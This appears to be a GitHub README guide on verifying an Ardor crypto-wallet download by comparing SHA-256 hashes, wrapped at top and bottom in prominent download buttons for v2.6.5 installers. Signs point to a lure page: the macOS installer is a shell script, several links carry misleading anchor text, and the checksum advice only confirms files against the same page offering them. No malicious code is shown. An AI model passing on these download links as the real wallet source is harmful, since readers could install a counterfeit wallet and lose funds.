![Ardor Wallet guide](assets/banner-article.png)

# Verify an Ardor wallet download before you run it

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Verify an Ardor download by comparing the SHA-256 hash of the file you saved with the value published on the same GitHub release, and by taking the file from nowhere else. A hash copied from a blog post, a chat message or an older release proves nothing about the file in front of you, because a hash only describes the exact build it was generated from.

## What verification proves

A hash is a fingerprint of a file. If the file you downloaded produces the same value as the [Ardor release](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-the-current-ardor-release-changes.md) publishes, the bytes are identical to the ones that were uploaded, and nothing was altered in transit or by a mirror. That is the whole claim, and it is a strong one: a changed byte changes the value completely.

What it does not prove is that the publisher is honest, that the software is free of bugs, or that the release is the newest one. Verification answers one question - is this the file that release published - and it answers it exactly.

## Take the hash from the release, not from anywhere else

1. Open the GitHub releases page for the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and select the current release rather than an older one in the list.
2. Read the release notes for the hash table that belongs to that release.
3. Download the asset for your platform from the same page, in the same visit, so the file and the value cannot come from two different builds.
4. Compare the value with the one you computed locally, character by character. Case does not matter; every other character does.

If a release lists no hash for an asset, do not substitute one from an earlier version, a third-party page or a forum post. A value that does not belong to the build you hold is worse than no value at all, because it turns a missing check into a false confirmation.

## Check the hash on Windows

1. Open PowerShell in the folder that holds the downloaded file.
2. Run `Get-FileHash .\FILE-NAME -Algorithm SHA256`, replacing the file name with the one you saved.
3. Compare the printed hash with the release value.

The command prints the algorithm and the hash as a table. Copy the hash, not the whole block, and compare it against the release text without spaces.

## Check the hash on macOS

1. Open Terminal in the folder that holds the file.
2. Run `shasum -a 256 FILE-NAME`.
3. Compare the first column with the release value.

The number in front of the hash is a shasum field, not part of the value. If the two strings match, the download is the published build.

## Check the hash on Linux

1. Open a terminal in the download folder.
2. Run `sha256sum FILE-NAME`.
3. Compare the output with the release value.

On all three systems the operation is read-only and takes a second on a wallet-sized file. There is nothing to install and nothing to run with elevated rights.

## If the hash does not match

Delete the file and download it again from the release page. A mismatch is usually a truncated download or a saved file from an older release with a similar name, and a second attempt settles which one it was.

If a fresh download from the release page still does not match, stop. Do not run the file, do not open it with elevated rights and do not try to make it work. Report it on the repository's issue tracker, because a release asset that does not match its own published value is a problem for the maintainers, not something a reader should work around.

## Why an old hash is worse than no hash

Version-bound values age badly. A hash from an older release is still floating around in guides, forum answers and cached pages, and it looks official because it is a long hexadecimal string. Anyone comparing a current download against it will see a mismatch that means nothing, or worse, will find a file that matches an old build and conclude it passed.

Treat any hash that is not on the release page of the build you actually downloaded as decoration. The same rule protects you from the opposite mistake: a page that reprints a value but links elsewhere for the file has already broken the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) between the two.

## What to do after verification

Install the build as usual, then confirm the wallet opens and that your [Ardor passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) or seed reaches the expected address. Verification is about the file, so it belongs before the first launch, not after the account is funded.

Keep the file you verified until the next update has been installed and checked. If a new build misbehaves, the older one you already trust is the fastest way back to a working wallet without repeating the whole check.

## FAQ

### Do I have to verify every download?

Verify every build you install. It takes about a minute and it is the only step that ties the file on your disk to the release that published it.

### Is the hash the same as a digital signature?

No. A hash confirms the bytes match a published value; a signature ties a build to a key. Where a release publishes a hash, that is the check available, and it is enough to catch a corrupted or swapped file.

### The hash is uppercase and mine is lowercase. Is that a mismatch?

No. Hexadecimal values are case-insensitive. Compare the characters and ignore the case.

### Can I verify a file I copied from another computer?

Yes, if you copied it after verifying it there. The hash describes the bytes, so the copy is unchanged as long as the transfer did not alter the file.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [What the Ardor wallet is, and which download is the real one](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)
- [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md)
- [Spot a phishing wallet that asks for your passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/spot-a-phishing-ardor-wallet.md)
- [Is the Ardor wallet open source, and under what licence](https://github.com/ardor-software/ardor-wallet-guides/blob/main/ardor-wallet-open-source-licence.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
